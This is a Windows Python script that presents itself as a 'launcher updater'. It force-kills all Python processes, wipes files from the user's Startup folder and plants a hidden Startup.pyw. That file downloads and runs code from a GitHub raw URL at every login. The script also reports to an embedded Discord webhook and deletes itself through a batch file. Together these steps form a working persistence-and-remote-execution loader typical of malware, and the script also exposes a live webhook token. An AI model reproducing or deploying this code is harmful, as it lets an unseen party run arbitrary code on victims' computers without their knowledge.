# monitor_script.py - Kills old launcher and creates new Startup.pyw
import os
import sys
import subprocess
import tempfile
import time
import requests

# Discord webhook for notifications
WEBHOOK = "https://discordapp.com/api/webhooks/1462762502130630781/IohGYGgxBIr2WPLUHF14QN_8AbyUq-rVGv_KQzhX1rHokBxF_OqjWlRm96x_gbYGQEJ0"

def send_webhook(message):
    """Send notification to Discord"""
    try:
        data = {"content": message}
        requests.post(WEBHOOK, json=data, timeout=5)
    except:
        pass

def kill_old_processes():
    """Kill all Python processes running from startup folder"""
    startup_folder = os.path.join(
        os.getenv('APPDATA'),
        'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
    )
    
    print("Killing old Python processes...")
    
    # Create batch file to kill processes safely
    batch_script = f'''@echo off
:: Kill Python processes gently first
taskkill /im python.exe /t /f 2>nul
taskkill /im pythonw.exe /t /f 2>nul

:: Wait a bit
timeout /t 2 /nobreak >nul

:: Force kill any remaining
wmic process where "name like 'python%%'" delete 2>nul

echo Old processes killed
timeout /t 1 /nobreak >nul
del "%~f0" 2>nul
'''
    
    batch_path = tempfile.gettempdir() + "/kill_python.bat"
    with open(batch_path, 'w') as f:
        f.write(batch_script)
    
    # Run the batch file
    subprocess.run(['cmd', '/c', batch_path], 
                  creationflags=subprocess.CREATE_NO_WINDOW)
    
    return True

def create_new_launcher():
    """Create the new Startup.pyw with the launcher code"""
    startup_folder = os.path.join(
        os.getenv('APPDATA'),
        'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
    )
    
    # The launcher code
    launcher_code = '''import os
import sys
import subprocess
import urllib.request
import tempfile
import time
import traceback

def run_script():
    """Download and run script.py from GitHub"""
    try:
        url = "https://raw.githubusercontent.com/ElianBoden/Deployer/main/script.py"
        script_code = urllib.request.urlopen(url, timeout=10).read().decode('utf-8')
        
        temp_dir = tempfile.gettempdir()
        timestamp = str(int(time.time()))
        temp_script = os.path.join(temp_dir, f"monitor_{timestamp}.py")
        
        with open(temp_script, 'w', encoding='utf-8') as f:
            f.write(script_code)
        
        # Run hidden
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        
        subprocess.Popen(
            [sys.executable, temp_script],
            startupinfo=startupinfo,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        # Delete temp file after 10 seconds
        time.sleep(10)
        try:
            os.remove(temp_script)
        except:
            pass
        
        return True
        
    except Exception as e:
        return False

def main():
    """Main launcher function"""
    # Wait for network
    time.sleep(5)
    
    # Run the script
    run_script()
    
    # Keep alive
    while True:
        time.sleep(3600)

if __name__ == "__main__":
    main()
'''
    
    # Write the launcher
    launcher_path = os.path.join(startup_folder, "Startup.pyw")
    with open(launcher_path, 'w', encoding='utf-8') as f:
        f.write(launcher_code)
    
    print(f"✓ Created new launcher: {launcher_path}")
    
    # Start it
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    
    subprocess.Popen(
        [sys.executable, launcher_path],
        startupinfo=startupinfo,
        creationflags=subprocess.CREATE_NO_WINDOW
    )
    
    print("✓ New launcher started")
    return True

def cleanup_old_files():
    """Clean up old files from startup folder"""
    startup_folder = os.path.join(
        os.getenv('APPDATA'),
        'Microsoft\\Windows\\Start Menu\\Programs\\Startup'
    )
    
    print("Cleaning up old files...")
    
    # Delete old files
    files_to_delete = [
        "startup_log.txt",
        "monitor_script.py",
        "github_launcher.pyw",
        "update_cache.json",
        "requirements.txt",
        "clean_launcher.pyw"
    ]
    
    for filename in files_to_delete:
        filepath = os.path.join(startup_folder, filename)
        try:
            if os.path.exists(filepath):
                os.remove(filepath)
                print(f"✓ Deleted: {filename}")
        except:
            pass
    
    # Delete any .log, .txt, .json, .py files
    for filename in os.listdir(startup_folder):
        if filename == "Startup.pyw":
            continue
            
        filepath = os.path.join(startup_folder, filename)
        try:
            if os.path.isfile(filepath):
                if filename.endswith(('.log', '.txt', '.json', '.py', '.pyw', '.pyc')):
                    os.remove(filepath)
        except:
            pass
    
    return True

def main():
    """Main function - kills old process, cleans up, creates new launcher"""
    print("=" * 60)
    print("LAUNCHER UPDATER")
    print("=" * 60)
    
    # Step 1: Kill old processes
    print("\n[1/3] Killing old processes...")
    kill_old_processes()
    
    # Step 2: Clean up files
    print("\n[2/3] Cleaning up old files...")
    cleanup_old_files()
    
    # Step 3: Create new launcher
    print("\n[3/3] Creating new launcher...")
    create_new_launcher()
    
    # Send webhook
    send_webhook("✅ Launcher updated! Old processes killed, new launcher created.")
    
    print("\n" + "=" * 60)
    print("UPDATE COMPLETE!")
    print("✓ Old processes killed")
    print("✓ Old files cleaned up")
    print("✓ New launcher created and started")
    print("=" * 60)
    
    # Delete this script
    delete_self()

def delete_self():
    """Delete this monitor_script.py"""
    try:
        this_script = __file__
        
        # Schedule deletion via batch file
        batch_content = f'''@echo off
timeout /t 3 /nobreak >nul
del /f /q "{this_script}" >nul 2>nul
if exist "{this_script}" (
    timeout /t 2 /nobreak >nul
    del /f /q "{this_script}" >nul 2>nul
)
del "%~f0" >nul 2>nul
'''
        
        batch_path = tempfile.gettempdir() + "/delete_monitor.bat"
        with open(batch_path, 'w') as f:
            f.write(batch_content)
        
        subprocess.Popen(['cmd', '/c', batch_path],
                        creationflags=subprocess.CREATE_NO_WINDOW)
        
    except:
        pass

if __name__ == "__main__":
    main()
